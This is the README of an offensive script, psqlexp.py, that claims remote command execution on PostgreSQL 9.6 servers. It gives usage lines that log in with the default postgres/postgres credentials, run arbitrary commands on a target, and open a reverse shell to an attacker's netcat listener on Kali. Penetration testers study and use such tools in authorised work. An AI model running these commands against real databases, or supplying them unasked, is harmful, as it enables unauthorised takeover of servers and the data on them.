# Postgre SQL RCE and Reverse Shell

Tested on PostgreSQL DB 9.6.0

## Install psycopg2
```bash
$ sudo apt-get install python3-psycopg2
```

## Usage
**Run command on target**

```bash
$ python3 psqlexp.py -T TARGET_IP -p 5432 -U postgres -P postgres --cmd
psqlexp# <custom command>
```

**Get Reverse shell from target**

```bash
[KALI]$ nc -lvnp 8080

$ python3 psqlexp.py -T TARGET_IP -p 5432 -U postgres -P postgres --lhost LOCAL_IP --lport 8080 --os-shell
```


# Future Developement
 - Add File read and Write Capability
 - Add UDF hack support
